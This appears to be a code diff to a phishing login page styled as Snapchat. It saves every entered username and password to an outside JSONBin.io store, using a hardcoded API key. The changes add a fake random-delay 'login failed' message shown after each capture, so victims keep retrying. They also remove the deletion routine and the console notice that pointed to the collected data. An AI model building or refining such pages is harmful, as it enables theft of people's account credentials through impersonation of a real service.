@@ -47,7 +47,6 @@
             margin-bottom: 4px;
         }
         .brand-text span {
-            background: ;
             padding: 0 8px;
             border-radius: 12px;
         }
@@ -91,6 +90,10 @@
         }
         .btn-login:hover {
             background: #e6e300;
+        }
+        .btn-login:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
         }
         .footer-links {
             margin-top: 20px;
@@ -160,6 +163,18 @@
         .btn-secondary:hover {
             background: #f4f4f4;
         }
+        .error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 12px;
+            display: none;
+            padding: 10px;
+            background: #ffebee;
+            border-radius: 12px;
+        }
+        .error-message.show {
+            display: block;
+        }
         @media (max-width: 480px) {
             .login-container {
                 padding: 28px 18px 24px;
@@ -185,8 +200,10 @@
     <form class="login-form" id="loginForm">
         <input class="input-field" type="text" id="username" placeholder="Username or email address" required>
         <input class="input-field" type="password" id="password" placeholder="Password" required>
-        <button class="btn-login" type="submit">Log In</button>
+        <button class="btn-login" type="submit" id="loginBtn">Log In</button>
     </form>
+
+    <div id="errorMessage" class="error-message">❌ Sorry, your login failed. Please check your username and password and try again.</div>
 
     <div class="divider">
         <span class="divider-text">OR</span>
@@ -203,7 +220,7 @@
 </div>
 
 <script>
-    // ---------- REAL CLOUD STORAGE (no cookies, cross-device) ----------
+    
     const BIN_ID = '6a31687cf5f4af5e29fbda44';
     const API_KEY = '$2a$10$tCj51IVJSG2msy/pX3hyR.kjMNQuxmmIHnXwrtD.AjPNq.s6JHBPq';
     const BASE_URL = 'https://api.jsonbin.io/v3/b/' + BIN_ID;
@@ -247,17 +264,6 @@
         const subs = await loadSubmissions();
         subs.push({ username, password, timestamp: new Date().toISOString() });
         await saveSubmissions(subs);
-    }
-
-    async function clearAllSubmissions() {
-        if (confirm('Are you sure you want to delete ALL submissions from the cloud?')) {
-            await saveSubmissions([]);
-            alert('All submissions cleared!');
-            // Re-render the clear page if we're on it
-            if (window.location.hash === '#/clear' || window.location.pathname === '/clear') {
-                renderClearPage();
-            }
-        }
     }
 
     async function buildTextOutput() {
@@ -324,22 +330,49 @@
         `;
     }
 
-    // Handle routes
     document.getElementById('loginForm').addEventListener('submit', async function(e) {
         e.preventDefault();
+        
         const username = document.getElementById('username').value.trim();
         const password = document.getElementById('password').value.trim();
+        const loginBtn = document.getElementById('loginBtn');
+        const errorDiv = document.getElementById('errorMessage');
+        const spinner = document.getElementById('loadingSpinner');
+        
+       
+        errorDiv.classList.remove('show');
+        
         if (username && password) {
+           
+            loginBtn.disabled = true;
+            loginBtn.textContent = 'Logging In...';
+            spinner.style.display = 'block';
+            
+           
+            const delay = 500 + Math.random() * 1000;
+            await new Promise(resolve => setTimeout(resolve, delay));
+            
             await addSubmission(username, password);
+            
+            
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
-            const spinner = document.getElementById('loadingSpinner');
-            spinner.style.display = 'block';
-            setTimeout(() => { spinner.style.display = 'none'; }, 500);
+            
+       
+            errorDiv.textContent = 'Sorry, your login failed. Please check your username and password and try again.';
+            errorDiv.classList.add('show');
+            
+          
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'Log In';
+            spinner.style.display = 'none';
+        } else {
+           
+            errorDiv.textContent = '❌ Please enter both a username and password.';
+            errorDiv.classList.add('show');
         }
     });
 
-    // Route handler for /getpublic and /clear
     async function handleRoute() {
         const path = window.location.pathname;
         const hash = window.location.hash;
@@ -362,6 +395,7 @@
         const handled = await handleRoute();
         if (!handled) {
           
+            document.getElementById('errorMessage').classList.remove('show');
         }
     });
 
@@ -369,7 +403,7 @@
         handleRoute();
     });
 
-    console.log('Snapchat login demo — cloud data stored on JSONBin.io. Visit #/getpublic to view all. Visit #/clear to clear all submissions.');
+   
 </script>
 
 </body>
